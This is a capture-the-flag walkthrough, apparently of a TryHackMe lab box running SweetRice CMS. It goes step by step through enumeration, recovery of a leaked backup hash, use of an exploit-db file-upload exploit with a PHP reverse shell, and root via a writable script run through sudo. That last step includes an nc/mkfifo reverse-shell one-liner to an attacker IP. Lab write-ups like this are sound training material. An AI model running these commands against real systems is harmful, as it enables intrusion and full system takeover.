Target: 10.10.160.79

## Enumeration:

nmap
```bash
$ nmap -sC -sV 10.10.160.79
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 11:03 PDT
Nmap scan report for 10.10.160.79
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

gobuster
```bash
$ gobuster dir -u http://10.10.160.79 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -z

/content              (Status: 301) [Size: 314] [--> http://10.10.160.79/content/]
```

## Foothold:

search for sweetrice exploits

[Exploit Link](https://www.exploit-db.com/exploits/40718)

http://10.10.160.79/content/inc/mysql_backup/
```sql
'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{
<snip>
s:5:\\"admin\\";
s:7:\\"manager\\";
s:6:\\"passwd\\";
s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";
<snip>
```

hashcat
```bash
$ hashcat -m 0 -o crack.txt '42f749ade7f9e195bf475f37a44cafcb' /usr/share/wordlists/rockyou.txt
> Password123
```

Loot:

manager:Password123

test creds to http://10.10.160.79/content/as/

[Exploit Link](https://www.exploit-db.com/exploits/40716)

edit 40716.py
```
host = '10.10.160.79/content'
username = 'manager'
password = 'Password123'
filename = 'php-reverse-shell.php5'
```

[Payload Link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

run exploit
```bash
$ python 40716.py
```

open nc session
```bash
nc -lnvp 8888
```

open link http://10.10.160.79/content/attachment/php-reverse-shel.php5


## Lateral Movement:

## Priv Escalation:

```bash
$ cd/home/itguy
$ cat user.txt
<redacted>
```

```bash
$ sudo -l
<snip>
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

```bash
$ ls -la 
<snip>
-rw-r--r-x   1 root root      47 Nov 29  2019 backup.pl
```

```bash
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```bash
$ ls -la /etc/ | grep 'copy.sh'
-rw-r--rwx   1 root root      81 Nov 29  2019 copy.sh
```

```bash
$ cat /etc/copy.sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

```bash
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.4.181 5554 >/tmp/f" > /etc/copy.sh
```

open another nc session
```bash
$ nc -lnvp 5554
```

run on www-data
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

run on root
```bash
$ cat /root/root.txt
<redacted>
```
